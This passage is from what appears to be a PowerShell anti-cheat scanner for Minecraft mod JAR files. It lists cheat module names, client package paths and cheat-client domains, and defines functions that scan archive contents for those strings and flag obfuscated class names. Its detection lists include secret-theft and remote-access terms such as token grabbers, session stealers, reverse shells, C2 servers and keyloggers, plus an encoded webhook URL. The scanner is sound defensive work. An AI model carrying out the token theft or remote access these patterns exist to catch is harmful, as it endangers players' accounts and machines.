    "FastPlace", "WalskyOptimizer", "WalksyOptimizer", "walsky.optimizer",
    "WalksyCrystalOptimizerMod", "Donut", "Replace Mod",
    "ShieldDisabler", "SilentAim", "Totem Hit", "Wtap", "FakeLag", "dev.virel",
    "BlockESP", "dev.krypton", "dev/krypton", "skid.krypton", "skid/krypton",  "AntiMissClick",
    "LagReach", "PopSwitch", "SprintReset", "ChestSteal", "AntiBot",
    "ElytraSwap", "FastXP", "FastExp", "Refill",  "AirAnchor",
    "jnativehook", "FakeInv", "HoverTotem", "AutoClicker", "AutoFirework",
    "PackSpoof", "Antiknockback", "catlean", 
    "AuthBypass", "Asteria", "Prestige", "AutoEat", "AutoMine",
    "MaceSwap",  "Macro198", "StunSlam", "SafeAnchor", "DoubleAnchor", "AutoTPA", "BaseFinder", "Xenon", "gypsy",
    "AutoPotRefill", "WalksyOptimizer", "KeyPearl", "AimAssist", "AutoNethPot", "AutoDtap",
    "TriggerBot", "AutoWeb", "AnchorAction", "Bloom", "Clumps",
    
    "org.chainlibs.module.impl.modules.Crystal.Y",
    "org.chainlibs.module.impl.modules.Crystal.bF",
    "org.chainlibs.module.impl.modules.Crystal.bM",
    "org.chainlibs.module.impl.modules.Crystal.bY",
    "org.chainlibs.module.impl.modules.Crystal.bq",
    "org.chainlibs.module.impl.modules.Crystal.cv",
    "org.chainlibs.module.impl.modules.Crystal.o",
    "org.chainlibs.module.impl.modules.Blatant.I",
    "org.chainlibs.module.impl.modules.Blatant.bR",
    "org.chainlibs.module.impl.modules.Blatant.bx",
    "org.chainlibs.module.impl.modules.Blatant.cj",
    "org.chainlibs.module.impl.modules.Blatant.dk",
    "imgui.gl3", "imgui.glfw",
    "BowAim", "Criticals", "Fakenick", "FakeItem",
    "invsee", "ItemExploit", "Hellion", "hellion",
    "LicenseCheckMixin", "ClientPlayerInteractionManagerAccessor",
    "ClientPlayerEntityMixim", "dev.gambleclient", "obfuscatedAuth",
    "phantom-refmap.json", "xyz.greaj",
    "じ.class", "ふ.class", "ぶ.class", "ぷ.class", "た.class",
    "ね.class", "そ.class", "な.class", "ど.class", "ぐ.class",
    "ず.class", "で.class", "つ.class", "べ.class", "せ.class",
    "と.class", "み.class", "び.class", "す.class", "の.class"
)

$cheatStrings = @(
    "AutoCrystal", "autocrystal", "auto crystal", "cw crystal", "JDWP.VirtualMachine.AllModules",
    "dontPlaceCrystal", "dontBreakCrystal", "dev.virel",
    "AutoHitCrystal", "autohitcrystal", "canPlaceCrystalServer", "healPotSlot",
    "ＡｕｔｏＣｒｙｓｔａｌ", "Ａｕｔｏ Ｃｒｙｓｔａｌ",
    "ＡｕｔｏＨｉｔＣｒｙｓｔａｌ",
    "AutoAnchor", "autoanchor", "auto anchor", "DoubleAnchor",
     "HasAnchor", "anchortweaks", "anchor macro", "safe anchor", "safeanchor",
    "SafeAnchor", "AirAnchor",
    "ＡｕｔｏＡｎｃｈｏｒ", "Ａｕｔｏ Ａｎｃｈｏｒ",
    "ＤｏｕｂｌｅＡｎｃｈｏｒ", "Ｄｏｕｂｌｅ Ａｎｃｈｏｒ",
    "ＳａｆｅＡｎｃｈｏｒ", "Ｓａｆｅ Ａｎｃｈｏｒ",
    "Ａｎｃｈｏｒ Ｍａｃｒｏ", "anchorMacro",
    "AutoTotem", "autototem", "auto totem", "InventoryTotem",
    "inventorytotem", "HoverTotem", "hover totem", "legittotem",
    "ＡｕｔｏＴｏｔｅｍ", "Ａｕｔｏ Ｔｏｔｅｍ",
    "ＨｏｖｅｒＴｏｔｅｍ", "Ｈｏｖｅｒ Ｔｏｔｅｍ",
    "ＩｎｖｅｎｔｏｒｙＴｏｔｅｍ", "Ａｕｔｏ Ｉｎｖｅｎｔｏｒｙ Ｔｏｔｅｍ",
    "Ａｕｔｏ Ｔｏｔｅｍ Ｈｉｔ",
    "AutoPot", "autopot", "auto pot", "speedPotSlot", "strengthPotSlot",
    "AutoArmor", "autoarmor", "auto armor",
    "ＡｕｔｏＰｏｔ", "Ａｕｔｏ Ｐｏｔ",
    "Ａｕｔｏ Ｐｏｔ Ｒｅｆｉｌｌ", "AutoPotRefill",
    "ＡｕｔｏＡｒｍｏｒ", "Ａｕｔｏ Ａｒｍｏｒ",
    "preventSwordBlockBreaking", "preventSwordBlockAttack",
    "ShieldDisabler", "ShieldBreaker",
    "ＳｈｉｅｌｄＤｉｓａｂｌｅｒ", "Ｓｈｉｅｌｄ Ｄｉｓａｂｌｅｒ",
    "Breaking shield with axe...",
    "AutoDoubleHand", "autodoublehand", "auto double hand",
    "ＡｕｔｏＤｏｕｂｌｅＨａｎｄ", "Ａｕｔｏ Ｄｏｕｂｌｅ Ｈａｎｄ",
    "AutoClicker",
    "ＡｕｔｏＣｌｉｃｋｅｒ",
    "Failed to switch to mace after axe!",
    "AutoMace", "MaceSwap", "SpearSwap",
    "ＡｕｔｏＭａｃｅ", "Ａｕｔｏ Ｍａｃｅ",
    "ＭａｃｅＳｗａｐ", "Ｍａｃｅ Ｓｗａｐ",
    "Ｓｐｅａｒ Ｓｗａｐ", "Ａｕｔｏｍａｔｉｃａｌｌｙ ａｘｅ ａｎｄ ｍａｃｅ ｓｈｉｅｌｄｅｄ ｐｌａｙｅｒｓ",
    "Ｓｔｕｎ Ｓｌａｍ", "StunSlam",
    "Donut", "JumpReset", "axespam", "axe spam",
    
    "findKnockbackSword", "attackRegisteredThisClick",
    "AimAssist", "aimassist", "aim assist",
    "triggerbot", "trigger bot",
    "ＡｉｍＡｓｓｉｓｔ", "Ａｉｍ Ａｓｓｉｓｔ",
    "ＴｒｉｇｇｅｒＢｏｔ", "Ｔｒｉｇｇｅｒ Ｂｏｔ",
    "Silent Rotations", "SilentRotations",
    "Ｓｉｌｅｎｔ Ｒｏｔａｔｉｏｎｓ",
    "FakeInv", "swapBackToOriginalSlot",
    "FakeLag", "pingspoof", "ping spoof",
    "ＦａｋｅＬａｇ", "Ｆａｋｅ Ｌａｇ",
    "fakePunch", "Fake Punch",
    "Ｆａｋｅ Ｐｕｎｃｈ",
    "mace_swap", "quick_strike", "macro_198", "stun_slam",
    "safe_anchor", "double_anchor", "auto_pot_refill",
    "walksy_optimizer", "key_pearl", "aim_assist",
    "auto_neth_pot", "auto_dtap", "trigger_bot", "auto_web",
    "DOUBLE_ESCAPE", "DOUBLE_RIGHTCLICK_FIRST", "DOUBLE_RIGHTCLICK_SECOND",
    "POST_CYCLE_DELAY", "PLACE_OBI", "WAIT_OBI", "PLACE_CRYSTAL", "BREAK_CRYSTAL",
    "ROTATING_DOWN", "ROTATING_BACK", "REFILLING", "PLANTING", "BONEMEALING",
    "AnchorAction", "Places two anchors for massive damage",
    "REOFFHAND_TOTEM",
    "webmacro", "web macro",
    "AntiWeb", "AutoWeb",
    "Ａｎｔｉ Ｗｅｂ", "ＡｕｔｏＷｅｂ",
    "Ｐｌａｃｅｓ Ｗｅｂｓ Ｏｎ Ｅｎｅｍｉｅｓ",
    "lvstrng", "dqrkis", "selfdestruct", "self destruct",
    "WalksyCrystalOptimizerMod", "WalksyOptimizer", "WalskyOptimizer",
    "Ｗａｌｋｓｙ Ｏｐｔｉｍｉｚｅｒ",
    "autoCrystalPlaceClock",
    "AutoFirework", "ElytraSwap", "FastXP", "FastExp", "NoJumpDelay",
    "ＥｌｙｔｒａＳｗａｐ", "Ｅｌｙｔｒａ Ｓｗａｐ",
    "PackSpoof", "Antiknockback", "catlean",
    "AuthBypass", "obfuscatedAuth", "LicenseCheckMixin",
    "BaseFinder", "invsee", "ItemExploit",
    "FreezePlayer",
    "Ｆｒｅｅｃａｍ", "Ｍｏｖｅ ｆｒｅｅｌｙ ｔｈｒｏｕｇｈ ｗａｌｌｓ",
    "Ｎｏ Ｃｌｉｐ", "Ｆｒｅｅｚｅ Ｐｌａｙｅｒ",
    "LWFH Crystal", "JDWP.VirtualMachine.AllModules",
    "ＬＷＦＨ Ｃｒｙｓｔａｌ",
    "KeyPearl", "LootYeeter",
    "ＫｅｙＰｅａｒｌ", "Ｋｅｙ Ｐｅａｒｌ",
    "Ｌｏｏｔ Ｙｅｅｔｅｒ",
    "FastPlace",
    "Ｆａｓｔ Ｐｌａｃｅ", "Ｐｌａｃｅ ｂｌｏｃｋｓ ｆａｓｔｅｒ",
    "AutoBreach",
    "Ａｕｔｏ Ｂｒｅａｃｈ",
    "setBlockBreakingCooldown", "getBlockBreakingCooldown", "blockBreakingCooldown",
    "onBlockBreaking", "setItemUseCooldown",
    "invokeDoAttack", "invokeDoItemUse", "invokeOnMouseButton",
    "onPushOutOfBlocks", "onIsGlowing",
    "Automatically switches to sword when hitting with totem",
    "arrayOfString", "POT_CHEATS",
    "Dqrkis Client", "Entity.isGlowing",
    "Activate Key", "Ａｃｔｉｖａｔｅ Ｋｅｙ",
    "Click Simulation", "Ｃｌｉｃｋ Ｓｉｍｕｌａｔｉｏｎ",
    "On RMB", "Ｏｎ ＲＭＢ",
    "No Count Glitch", "Ｎｏ Ｃｏｕｎｔ Ｇｌｉｔｃｈ",
    "No Bounce", "NoBounce", "Ｎｏ Ｂｏｕｎｃｅ", "ＮｏＢｏｕｎｃｅ",
    "Ｒｅｍｏｖｅｓ ｔｈｅ ｃｒｙｓｔａｌ ｂｏｕｎｃｅ ａｎｉｍａｔｉｏｎ",
    "Place Delay", "Ｐｌａｃｅ Ｄｅｌａｙ",
    "Break Delay", "Ｂｒｅａｋ Ｄｅｌａｙ",
     "Ｆａｓｔ Ｍｏｄｅ",
    "Place Chance", "Ｐｌａｃｅ Ｃｈａｎｃｅ",
    "Break Chance", "Ｂｒｅａｋ Ｃｈａｎｃｅ",
    "Stop On Kill", "Ｓｔｏｐ Ｏｎ Ｋｉｌｌ",
    "Ｄａｍａｇｅ Ｔｉｃｋ", "damagetick",
    "Anti Weakness", "Ａｎｔｉ Ｗｅａｋｎｅｓｓ",
    "Particle Chance", "Ｐａｒｔｉｃｌｅ Ｃｈａｎｃｅ",
    "Trigger Key", "Ｔｒｉｇｇｅｒ Ｋｅｙ",
    "Switch Delay", "Ｓｗｉｔｃｈ Ｄｅｌａｙ",
    "Totem Slot", "Ｔｏｔｅｍ Ｓｌｏｔ",
    "Silent Rotations", "Ｓｉｌｅｎｔ Ｒｏｔａｔｉｏｎｓ",
    "Smooth Rotations", "Ｓｍｏｏｔｈ Ｒｏｔａｔｉｏｎｓ",
    "Rotation Speed", "Ｒｏｔａｔｉｏｎ Ｓｐｅｅｄ",
    "Use Easing", "Ｕｓｅ Ｅａｓｉｎｇ",
    "Easing Strength", "Ｅａｓｉｎｇ Ｓｔｒｅｎｇｔｈ",
    "While Use", "Ｗｈｉｌｅ Ｕｓｅ",
    "Stop on Kill", "Ｓｔｏｐ ｏｎ Ｋｉｌｌ",
    "Click Simulation", "Ｃｌｉｃｋ Ｓｉｍｕｌａｔｉｏｎ",
    "Glowstone Delay", "Ｇｌｏｗｓｔｏｎｅ Ｄｅｌａｙ",
    "Glowstone Chance", "Ｇｌｏｗｓｔｏｎｅ Ｃｈａｎｃｅ",
    "Explode Delay", "Ｅｘｐｌｏｄｅ Ｄｅｌａｙ",
    "Explode Chance", "Ｅｘｐｌｏｄｅ Ｃｈａｎｃｅ",
    "Explode Slot", "Ｅｘｐｌｏｄｅ Ｓｌｏｔ",
    "Only Charge", "Ｏｎｌｙ Ｃｈａｒｇｅ",
    "Anchor Macro", "Ａｎｃｈｏｒ Ｍａｃｒｏ",
    "Reach Distance", "Ｒｅａｃｈ Ｄｉｓｔａｎｃｅ",
    "Min Height", "Ｍｉｎ Ｈｅｉｇｈｔ",
    "Min Fall Speed", "Ｍｉｎ Ｆａｌｌ Ｓｐｅｅｄ",
    "Attack Delay", "Ａｔｔａｃｋ Ｄｅｌａｙ",
    "Breach Delay", "Ｂｒｅａｃｈ Ｄｅｌａｙ",
    "Require Elytra", "Ｒｅｑｕｉｒｅ Ｅｌｙｔｒａ",
    "Auto Switch Back", "Ａｕｔｏ Ｓｗｉｔｃｈ Ｂａｃｋ",
    "Check Line of Sight", "Ｃｈｅｃｋ Ｌｉｎｅ ｏｆ Ｓｉｇｈｔ",
    "Only When Falling", "Ｏｎｌｙ Ｗｈｅｎ Ｆａｌｌｉｎｇ",
    "Require Crit", "Ｒｅｑｕｉｒｅ Ｃｒｉｔ",
    "Show Status Display", "Ｓｈｏｗ Ｓｔａｔｕｓ Ｄｉｓｐｌａｙ",
    "Stop On Crystal", "Ｓｔｏｐ Ｏｎ Ｃｒｙｓｔａｌ",
    "Check Shield", "Ｃｈｅｃｋ Ｓｈｉｅｌｄ",
    "On Pop", "Ｏｎ Ｐｏｐ",
    "Predict Damage", "Ｐｒｅｄｉｃｔ Ｄａｍａｇｅ",
    "On Ground", "Ｏｎ Ｇｒｏｕｎｄ",
    "Check Players", "Ｃｈｅｃｋ Ｐｌａｙｅｒｓ",
    "Predict Crystals", "Ｐｒｅｄｉｃｔ Ｃｒｙｓｔａｌｓ",
    "Check Aim", "Ｃｈｅｃｋ Ａｉｍ",
    "Check Items", "Ｃｈｅｃｋ Ｉｔｅｍｓ",
    "Activates Above", "Ａｃｔｉｖａｔｅｓ Ａｂｏｖｅ",
    "Blatant", "Ｂｌａｔａｎｔ",
    "Force Totem", "Ｆｏｒｃｅ Ｔｏｔｅｍ",
    "Stay Open For", "Ｓｔａｙ Ｏｐｅｎ Ｆｏｒ",
    "Auto Inventory Totem", "Ａｕｔｏ Ｉｎｖｅｎｔｏｒｙ Ｔｏｔｅｍ",
    "Only On Pop", "Ｏｎｌｙ Ｏｎ Ｐｏｐ",
    "Vertical Speed", "Ｖｅｒｔｉｃａｌ Ｓｐｅｅｄ",
    "Hover Totem", "Ｈｏｖｅｒ Ｔｏｔｅｍ",
    "Swap Speed", "Ｓｗａｐ Ｓｐｅｅｄ",
    "Strict One-Tick", "Ｓｔｒｉｃｔ Ｏｎｅ－Ｔｉｃｋ",
    "Mace Priority", "Ｍａｃｅ Ｐｒｉｏｒｉｔｙ",
    "Min Totems", "Ｍｉｎ Ｔｏｔｅｍｓ",
    "Min Pearls", "Ｍｉｎ Ｐｅａｒｌｓ",
    "Totem First", "Ｔｏｔｅｍ Ｆｉｒｓｔ",
    "Drop Interval", "Ｄｒｏｐ Ｉｎｔｅｒｖａｌ",
    "Random Pattern", "Ｒａｎｄｏｍ Ｐａｔｔｅｒｎ",
    "Loot Yeeter", "Ｌｏｏｔ Ｙｅｅｔｅｒ",
    "Horizontal Aim Speed", "Ｈｏｒｉｚｏｎｔａｌ Ａｉｍ Ｓｐｅｅｄ",
    "Vertical Aim Speed", "Ｖｅｒｔｉｃａｌ Ａｉｍ Ｓｐｅｅｄ",
    "Include Head", "Ｉｎｃｌｕｄｅ Ｈｅａｄ",
    "Web Delay", "Ｗｅｂ Ｄｅｌａｙ",
    "Holding Web", "Ｈｏｌｄｉｎｇ Ｗｅｂ",
    "Not When Affects Player", "Ｎｏｔ Ｗｈｅｎ Ａｆｆｅｃｔｓ Ｐｌａｙｅｒ",
    "Hit Delay", "Ｈｉｔ Ｄｅｌａｙ",
    "Ｓｗｉｔｃｈ Ｂａｃｋ",
    "Require Hold Axe", "Ｒｅｑｕｉｒｅ Ｈｏｌｄ Ａｘｅ",
    "Fake Punch", "Ｆａｋｅ Ｐｕｎｃｈ",
    "placeInterval", "breakInterval", "stopOnKill",
    "activateOnRightClick", "holdCrystal",
    "ｐｌａｃｅＩｎｔｅｒｖａｌ", "ｂｒｅａｋＩｎｔｅｒｖａｌ",
    "ｓｔｏｐＯｎＫｉｌｌ", "ａｃｔｉｖａｔｅＯｎＲｉｇｈｔＣｌｉｃｋ",
    "ｄａｍａｇｅｔｉｃｋ", "ｈｏｌｄＣｒｙｓｔａｌ",
    "ｆａｋｅＰｕｎｃｈ",
    "Ｒｅｆｉｌｌｓ ｙｏｕｒ ｈｏｔｂａｒ ｗｉｔｈ ｐｏｔｉｏｎｓ",
    "Ｋｅｐｓ ｙｏｕ ｓｐｒｉｎｔｉｎｇ ａｔ ａｌｌ ｔｉｍｅｓ",
    "Ｐｌａｃｅｓ ａｎｃｈｏｒ， ｃｈａｒｇｅｓ ｉｔ， ｐｒｏｔｅｃｔｓ ｙｏｕ， ａｎｄ ｅｘｐｌｏｄｅｓ",
    "Ａｕｔｏ ｓｗａｐ ｔｏ ｓｐｅａｒ ｏｎ ａｔｔａｃｋ",
    "Macro Key", "Ａｕｔｏ Ｐｏｔ", "Ｍａｃｒｏ Ｋｅｙ",
    "KillAura", "ClickAura", "MultiAura", "ForceField", "LegitAura",
    "AimBot", "AutoAim", "SilentAim", "AimLock", "HeadSnap",
    "CrystalAura",
    "AnchorAura", "AnchorFill", "AnchorPlace",
    "BedAura", "AutoBed", "BedBomb", "BedPlace",
    "BowAimbot", "BowSpam", "AutoBow",
    "AutoCrit", "CritBypass", "AlwaysCrit", "CriticalHit",
    "ReachHack", "ExtendReach", "LongReach", "HitboxExpand",
    "AntiKB", "NoKnockback", "GrimVelocity", "GrimDisabler", "VelocitySpoof", "KBReduce",
    "OffhandTotem", "TotemSwitch",
    "AutoWeapon", "AutoSword", "AutoCity", "Burrow", "SelfTrap",
    "HoleFiller", "AntiSurround", "AntiBurrow",
    "WTap", "TargetStrafe", "AutoGap", "AutoPearl",
    "FlyHack", "CreativeFlight", "BoatFly", "PacketFly", "AirJump",
    "SpeedHack", "BHop", "BunnyHop",
    "AntiFall", "NoFallDamage", "SafeFall",
    "StepHack", "FastClimb", "AutoStep", "HighStep",
    "WaterWalk", "LiquidWalk", "LavaWalk",
    "NoSlow", "NoSlowdown", "NoWeb", "NoSoulSand",
    "WallHack",
    "ElytraSpeed", "InstantElytra",
    "ScaffoldWalk", "FastBridge", "BuildHelper", "AutoBridge",
    "Nuker", "NukerLegit", "InstantBreak",
    "GhostHand", "NoSwing",
    "PlaceAssist", "AirPlace", "AutoPlace", "InstantPlace",
    "PlayerESP", "MobESP", "ItemESP", "StorageESP", "ChestESP",
    "NameTagsHack",
    "XRayHack", "OreFinder", "CaveFinder", "OreESP",
    "NewChunks", "TunnelFinder",
    "TargetHUD", "ReachDisplay",
    "DoubleClicker", "JitterClick", "ButterflyClick", "CPSBoost",
    "ChestStealer", "InvManager", "InvMovebypass",
    "AutoSprint", "AntiAFK", "AutoRespawn",
    "PopSwitch",
    "FakeLatency", "FakePing", "SpoofRotation", "PositionSpoof",
    "GameSpeed", "SpeedTimer",
     "GrimBypass", "VulcanBypass", "MatrixBypass",
    "AACBypass", "VerusDisabler", "IntaveBypass", "WatchdogBypass",
    "PacketMine", "PacketWalk", "PacketSneak", "PacketCancel", "PacketDupe", "PacketSpam",
    "SelfDestruct", "HideClient",
    "SessionStealer", "TokenLogger", "TokenGrabber", "DiscordToken",
    "RemoteAccess", "ReverseShell", "C2Server", "KeyLogger",
    "StashFinder", "TrailFinder",
    "imgui.binding",
    "JNativeHook", "GlobalScreen", "NativeKeyListener",
    "client-refmap.json", "cheat-refmap.json",
    "aHR0cDovL2FwaS5ub3ZhY2xpZW50LmxvbC93ZWJob29rLnR4dA==",
    "meteordevelopment", "cc/novoline",
    "com/alan/clients", "club/maxstats", "wtf/moonlight",
    "me/zeroeightsix/kami", "net/ccbluex", "today/opai",
    "net/minecraft/injection", "org/chainlibs/module/impl/modules",
    "xyz/greaj", "com/cheatbreaker", "com/moonsworth",
    "doomsdayclient", "DoomsdayClient", "doomsday.jar",
    "novaclient", "api.novaclient.lol",
    "WalksyOptimizer", "LWFH Crystal",
    "vape.gg", "vapeclient", "VapeClient", "VapeLite",
    "intent.store", "IntentClient",
    "rise.today", "riseclient.com",
    "meteor-client", "meteorclient", "meteordevelopment.meteorclient",
    "liquidbounce", "fdp-client", "net.ccbluex",
    "novoware", "novoclient",
    "aristois", "impactclient", "azura",
    "pandaware", "skilled", "moonClient", "astolfo",
    "futureClient", "konas", "rusherhack", "exhibition",
    "dev.krypton", "dev/krypton", "skid.krypton", "skid/krypton",
     "VirginClient", "virgin client",
    "catlean", "CatleanClient", "catlean client",
     "ArgonClient", "argon client",
    "Asteria", "AsteriaClient", "asteria client",
    "Prestige", "PrestigeClient", "prestige client", "prestigeclient.vip",
    "gypsy", "GypsyClient", "gypsy client",
    "Xenon", "XenonClient", "xenon client",
     "GrimClient", "grim client",
    "phantom-refmap.json",
     "dqrkis.xyz", "Dqrkis Client"
)

$patternRegex = [regex]::new(
    '(?<![A-Za-z])(' + ($suspiciousPatterns -join '|') + ')(?![A-Za-z])',
    [System.Text.RegularExpressions.RegexOptions]::Compiled
)

$cheatStringSet = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)
foreach ($s in $cheatStrings) { [void]$cheatStringSet.Add($s) }

$cheatAscii = [System.Collections.Generic.List[string]]::new()
$cheatWide  = [System.Collections.Generic.List[string]]::new()
foreach ($s in $cheatStringSet) {
    if ($s -cmatch '[^\x00-\x7F]') { $cheatWide.Add($s) } else { $cheatAscii.Add($s) }
}

$fullwidthRegex = [regex]::new(
    "[\uFF21-\uFF3A\uFF41-\uFF5A\uFF10-\uFF19]{2,}",
    [System.Text.RegularExpressions.RegexOptions]::Compiled
)

$fwCheatPool = @($cheatStrings | Where-Object {
    $_ -cmatch "[\uFF21-\uFF3A\uFF41-\uFF5A\uFF10-\uFF19]"
})

$ScanCode = @'
function Invoke-ModScan {
    param([string]$FilePath)

    $foundPatterns  = [System.Collections.Generic.HashSet[string]]::new()
    $foundStrings   = [System.Collections.Generic.HashSet[string]]::new()
    $foundFullwidth = [System.Collections.Generic.HashSet[string]]::new()
    $useFast = [bool]('FastScan' -as [type])

    try {
        $archive = [System.IO.Compression.ZipFile]::OpenRead($FilePath)

        foreach ($entry in $archive.Entries) {
            foreach ($m in $patternRegex.Matches($entry.FullName)) {
                [void]$foundPatterns.Add($m.Value)
            }
        }

        $allEntries    = [System.Collections.Generic.List[object]]::new()
        $innerArchives = [System.Collections.Generic.List[object]]::new()

        foreach ($e in $archive.Entries) { $allEntries.Add($e) }

        foreach ($nj in ($archive.Entries | Where-Object { $_.FullName -match "^META-INF/(jars|jarjar)/.+\.jar$" })) {
            try {
                $ns = $nj.Open()
                $ms = New-Object System.IO.MemoryStream
                $ns.CopyTo($ms); $ns.Close()
                $ms.Position = 0
                $iz = [System.IO.Compression.ZipArchive]::new($ms, [System.IO.Compression.ZipArchiveMode]::Read)
                $innerArchives.Add($iz)
                foreach ($ie in $iz.Entries) { $allEntries.Add($ie) }
            } catch { }
        }

        foreach ($entry in $allEntries) {
            $name = $entry.FullName

            if ($name -match '\.(class|json)$' -or $name -match 'MANIFEST\.MF') {
                try {
                    $st = $entry.Open()
                    $ms2 = New-Object System.IO.MemoryStream
                    $st.CopyTo($ms2); $st.Close()
                    $bytes = $ms2.ToArray(); $ms2.Dispose()

                    $ascii = [System.Text.Encoding]::ASCII.GetString($bytes)

                    foreach ($m in $patternRegex.Matches($ascii)) { [void]$foundPatterns.Add($m.Value) }

                    if ($useFast) {
                        [FastScan]::FindAll($ascii, $cheatAscii, $foundStrings)
                    } else {
                        foreach ($s in $cheatAscii) {
                            if ($ascii.Contains($s)) { [void]$foundStrings.Add($s) }
                        }
                    }

                    # wide / fullwidth strings need at least one valid multi-byte UTF-8 sequence
                    if ([System.Text.Encoding]::UTF8.GetCharCount($bytes) -ne $bytes.Length) {
                        $utf8 = [System.Text.Encoding]::UTF8.GetString($bytes)
                        if ($useFast) {
                            [FastScan]::FindAll($utf8, $cheatWide, $foundStrings)
                        } else {
                            foreach ($s in $cheatWide) {
                                if ($utf8.Contains($s)) { [void]$foundStrings.Add($s) }
                            }
                        }
                        foreach ($m in $fullwidthRegex.Matches($utf8)) {
                            [void]$foundFullwidth.Add($m.Value)
                        }
                    }
                } catch { }
            }
        }

        foreach ($ia in $innerArchives) { try { $ia.Dispose() } catch { } }
        $archive.Dispose()
    } catch { }

    $resolvedFullwidth = [System.Collections.Generic.HashSet[string]]::new()
    foreach ($fw in @($foundFullwidth)) {
        if ($fw.Length -lt 3) { continue }
        $bestMatch = $null
        foreach ($cs in $fwCheatPool) {
            if ($cs.Contains($fw)) {
                if ($null -eq $bestMatch -or $cs.Length -lt $bestMatch.Length) {
                    $bestMatch = $cs
                }
            }
        }
        if ($null -ne $bestMatch) {
            [void]$resolvedFullwidth.Add($bestMatch)
        } elseif ($fw.Length -ge 6) {
            [void]$resolvedFullwidth.Add($fw)
        }
    }
    $resolved = @($resolvedFullwidth)
    $finalFullwidth = [System.Collections.Generic.HashSet[string]]::new()
    foreach ($fw in $resolved) {
        $isRedundant = $false
        foreach ($other in $resolved) {
            if ($fw.Length -lt $other.Length -and $other.Contains($fw)) {
                $isRedundant = $true; break
            }
        }
        if (-not $isRedundant) { [void]$finalFullwidth.Add($fw) }
    }

    return @{ Patterns = $foundPatterns; Strings = $foundStrings; Fullwidth = $finalFullwidth }
}

function Invoke-ObfuscationScan {
    param([string]$FilePath)

    $flags = [System.Collections.Generic.List[string]]::new()

    try {
        $archive = [System.IO.Compression.ZipFile]::OpenRead($FilePath)

        $totalClass    = 0
        $numericCount  = 0
        $unicodeCount  = 0
        $fullwidthCount= 0
        $japaneseCount = 0
        $singleLetterCount = 0
        $twoLetterCount    = 0
        $gibberishCount    = 0
        $noVowelCount      = 0
        $confusionCount    = 0
        $singleCharPkg     = 0
        $contentSample     = [System.Text.StringBuilder]::new()
        $sampleSize        = 0

        $cheatObfuscators = @{
            "Skidfuscator"   = @("dev/skidfuscator", "Skidfuscator", "skidfuscator.dev")
            "Paramorphism"   = @("Paramorphism", "paramorphism-", "dev/paramorphism")
            "Radon"          = @("ItzSomebody/Radon", "me/itzsomebody/radon", "Radon Obfuscator")
            "Caesium"        = @("sim0n/Caesium", "Caesium Obfuscator", "dev/sim0n/caesium")
            "Bozar"          = @("vimasig/Bozar", "Bozar Obfuscator", "com/bozar")
            "Branchlock"     = @("Branchlock", "branchlock.dev")
            "Binscure"       = @("Binscure", "com/binscure")
            "SuperBlaubeere" = @("superblaubeere", "superblaubeere27")
            "Qprotect"       = @("Qprotect", "QProtect", "mdma.dev/qprotect")
            "Zelix"          = @("ZKMFLOW", "ZKM", "ZelixKlassMaster", "com/zelix")
            "Stringer"       = @("StringerJavaObfuscator", "com/licel/stringer")
            "JNIC"           = @("JNIC", "jnic.obf", "jnic-obfuscator")
            "Scuti"          = @("ScutiObf", "scuti.obf")
            "Smoke"          = @("SmokeObf", "smoke.obf")
        }

        foreach ($entry in $archive.Entries) {
            $name = $entry.FullName

            if ($name -match "\.class$") {
                $totalClass++
                $className = [System.IO.Path]::GetFileNameWithoutExtension(($name -split "/")[-1])

                if ($className -match "^\d+$")                          { $numericCount++ }
                if ($className -match "[^\x00-\x7F]")                   { $unicodeCount++ }
                if ($className -match "[\uFF21-\uFF3A\uFF41-\uFF5A\uFF10-\uFF19]") { $fullwidthCount++ }
                if ($className -match "[\u3040-\u309F\u30A0-\u30FF]")  { $japaneseCount++ }
                if ($className -match "^[a-zA-Z]$")                     { $singleLetterCount++ }
                if ($className -match "^[a-zA-Z]{2}$")                  { $twoLetterCount++ }
                if ($className -match "^[Il1O0]+$" -or $className -match "^[_]+$") { $confusionCount++ }

                if ($className.Length -ge 3 -and $className.Length -le 8 -and $className -match "^[a-zA-Z]+$") {
                    $vowels = [regex]::Matches($className, "[aeiouAEIOU]").Count
                    if ($vowels -eq 0) { $noVowelCount++ }
                    $hasCluster = $className -match "[bcdfghjklmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ]{3,}"
                    if ($hasCluster -and ($vowels / $className.Length) -lt 0.3) { $gibberishCount++ }
                }

                $segs = ($name -replace "\.class$", "") -split "/"
                foreach ($seg in $segs[0..($segs.Count - 2)]) {
                    if ($seg.Length -eq 1) { $singleCharPkg++ }
                }

                if ($sampleSize -lt 150000 -and $entry.Length -lt 100000 -and $entry.Length -gt 100) {
                    try {
                        $st = $entry.Open()
                        $ms = New-Object System.IO.MemoryStream
                        $st.CopyTo($ms); $st.Close()
                        $ascii = [System.Text.Encoding]::ASCII.GetString($ms.ToArray())
                        $ms.Dispose()
                        [void]$contentSample.Append($ascii)
                        $sampleSize += $ascii.Length
                    } catch { }
                }
            }
        }

        $archive.Dispose()

        if ($totalClass -lt 5) { return $flags }

        $pct = { param($n) [math]::Round(($n / $totalClass) * 100) }

        $numPct   = & $pct $numericCount
        $uniPct   = & $pct $unicodeCount
        $fwPct    = & $pct $fullwidthCount
        $jpPct    = & $pct $japaneseCount
        $s1Pct    = & $pct $singleLetterCount
        $s2Pct    = & $pct $twoLetterCount
        $gibPct   = & $pct $gibberishCount
        $novPct   = & $pct $noVowelCount
        $confPct  = & $pct $confusionCount

        if ($numPct   -ge 20) { $flags.Add("Numeric class names — $numPct% of classes have numeric-only names") }
        if ($uniPct   -ge 10) { $flags.Add("Unicode class names — $uniPct% of classes use non-ASCII characters") }
        if ($fwPct    -gt  0) { $flags.Add("Fullwidth Unicode class names — $fwPct% use ａｂｃ/ＡＢＣ/０１２ chars ($fullwidthCount classes)") }
        if ($jpPct    -gt  0) { $flags.Add("Japanese obfuscation — $jpPct% use hiragana/katakana class names ($japaneseCount classes)") }
        if ($s1Pct    -ge 15) { $flags.Add("Single-letter class names — $s1Pct% ($singleLetterCount classes)") }
        if ($s2Pct    -ge 20) { $flags.Add("Two-letter class names — $s2Pct% ($twoLetterCount classes)") }
        if ($gibPct   -ge  5 -and $gibberishCount -ge 4) { $flags.Add("Gibberish class names — $gibPct% have no vowels / consonant clusters ($gibberishCount classes)") }
        if ($novPct   -ge  8) { $flags.Add("No-vowel class names — $novPct% ($noVowelCount classes)") }
        if ($confPct  -ge  3) { $flags.Add("Confusion-char names (Il1O0/_) — $confPct% ($confusionCount classes)") }
